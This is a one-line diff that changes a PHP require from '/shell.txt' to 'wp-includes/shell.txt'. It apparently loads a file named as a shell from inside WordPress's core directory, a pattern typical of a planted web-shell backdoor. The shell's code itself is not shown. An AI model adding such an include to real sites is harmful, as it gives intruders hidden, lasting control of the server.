@@ -1,1 +1,1 @@
-require('/shell.txt');
+require('wp-includes/shell.txt');
